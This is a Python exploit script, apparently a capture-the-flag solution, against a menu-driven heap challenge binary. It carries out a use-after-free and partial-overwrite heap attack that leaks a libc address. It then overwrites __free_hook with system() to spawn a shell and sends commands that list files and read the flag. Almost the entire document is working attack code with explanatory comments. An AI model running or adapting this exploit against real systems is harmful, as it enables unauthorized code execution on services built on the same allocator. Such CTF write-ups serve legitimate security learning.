#!/usr/bin/env python3
from pwnutils import *
import sys
import telnetlib
from functools import partial
import time

system = 0x449c0
free_hook = 0x1bd8e8

if len(sys.argv) < 3:
    print("usage: <script> <host> <port>")
    sys.exit(1)

m = 1
def wr(sock, data):
    global m
    sock.send(b"w\n")
    sock.send(data)
    if b"\n" in data:
        print("warning: newline in data!")
    else:
        sock.send(b"\n")
    skip_menu(sock, j=0x10)
    m += 1

def re(sock, idx):
    global m
    sock.send(f"r\n{idx}\n".encode())
    skip_menu(sock)
    m += 1
    data = recv_until(sock, b"\n")
    return data

def ed(sock, idx, data):
    global m
    sock.send(f"e\n{idx}\n".encode())
    sock.send(data)
    if b"\n" in data:
        print("warning: newline in data!")
    else:
        sock.send(b"\n")
    skip_menu(sock, j=0x10)
    m += 1

def skip_menu(sock, j=0):
    global m
    d = b""
    while m > j:
        d += recv_until(sock, b"> ")
        m -= 1
    return d

arena = 0x7ff41032bca0 - 0x7ff410170000

with FlagSock() as s:
    w = partial(wr, s)
    r = partial(re, s)
    e = partial(ed, s)
    s.connect((sys.argv[1], int(sys.argv[2])))
    s.send(b"w" * 400)
    # have to chunks so that one can edit the size field of the other

    # problem: no print without free
    # solution: print one chunk with two sizes
    #   problem: two chunks have to point to the same data
    #   solution: heap feng shui
    # feng shui:
    # fake chunk will be placed at 0x100 boundary by UAF 1-Byte partial overwrite
    # fake chunkheader is contrallable by chunk at 0xf0 (0x10 to fake chunk, 0x20 chunk)

    w(b"A" * 0x90) # 0 0xa0 @ 0x450
    r(0)
    w(b"b" * 0x8 + b"\x21") # 0 0x20 @ 0x4f0
    w(b"c" * 0x10)          # 1 0x20 @ 0x510
    w(b"d" * 0x10)          # 2 0x20 @ 0x530
    w(b"e" * 0x30)          # 3 0x40 @ 0x550
    r(3)
    w(b"f" * 0x80)          # 3 0x90 @ 0x590
    r(2)
    r(1)
    e(1, b"")

    # |           |   0x4f0 0x510 0x530      0x550 0x5a0 
    # | tc | lbuf | A | b   | c   | d        | e   | f   
    # |           | - | b   | -   | -> 0x500 | -   |
    
    w(b"SPARTA")                          # 1 0x20 @ 0x510
    w(b"HEAPER".ljust(8, b"R") + b"\x91") # 2 0x20 @ 0x500
    r(3)
    r(1)
    r(2)

    # overflow int c, c -> 0x500
    # trashes 0x510 header
    w(b"HEAPER".ljust(0x10, b"R")) # 1 0x20 @ 0x500 
    r(1)
    w(b"HEAPER".ljust(8, b"R") + b"\x91") # 1 0x20 @ 0x500

    w(b"x" * 0x78 + b"\x91") # 2 0x90 @ 0x510 
    # clear fwd ptr of chunk
    for i in range(0x17, 0xf, -1):
        r(0)
        w(b"x" * i)
    w(b"x" * 0x80) # 3 0x90 @ 0x500

    r(0)
    w(b"x" * 8 + b"\x21") # 0 0x20 @ 0x4f0
    r(1)
    r(0)
    # <0x20>: -> 0x4f0 -> 0x500
    # <0x50>: -> 0x530
    # <0x90>: -> 0x510 -> 0x500
    # <0xa0>: -> 0x450

    for i in range(6):
        w(b"x" * 0x80) # 0,1,4-7: back

    for i in [0,1,4,5,6,7]:
        r(i)

    # <0x20>: -> 0x4f0 -> 0x500
    # <0x90>: -> far far away x 6

    # 2, 0x510, 3. 0x500 
    w(b"halp".ljust(8) + b"\x21")   # 0 @ 0x4f0
    w(b"double".ljust(8) + b"\x91") # 1 @ 0x500
    r(2)
    r(0)
    #input()
    w(b"SPARTA".ljust(8, b"A") + b"\x91") # 0 @ 0x4f0

    # 0. 0x4f0, 1. 0x500, 3. 0x500
    r(3)
    r(0)
    w(b"SPARTA".ljust(8, b"A") + b"\x21") # 0 @ 0x4f0
    leak = r(1)[:-1]
    assert(len(leak) == 6)
    libc = int.from_bytes(leak, "little") - arena
    print(f"libc {libc:#x}")
    #input()
    
    w(b"y" * 0x80) # 1 @ 0x510
    w(b"a" * 8 + b"\x21") # 2 @ 0x500
    r(1)
    r(2)
    r(0)
    w(b"a" * 0x10 + int.to_bytes(libc + free_hook, 6, "little")) # 0
    w(b"sh") # 1
    w(int.to_bytes(libc + system, 6, "little")) # 2
    r(1)
    #skip_menu(s)
    # w(b"echo SPARTA".ljust(0x8b) + b" ; sh")

    print("shell")
    #time.sleep(0.5)
    s.sendall(b'id;ls -l; cat flag*;exit;\nhxp\n')
    print(skip_menu(s).decode())
    s.sendall(b"hxp\n")

    d = b''
    while True:
        r = s.recv(4096)
        if not r:
            break
        print(r)
        d +=r
    print(r.decode())

    #t = telnetlib.Telnet()
    #t.sock = s
    #t.interact()
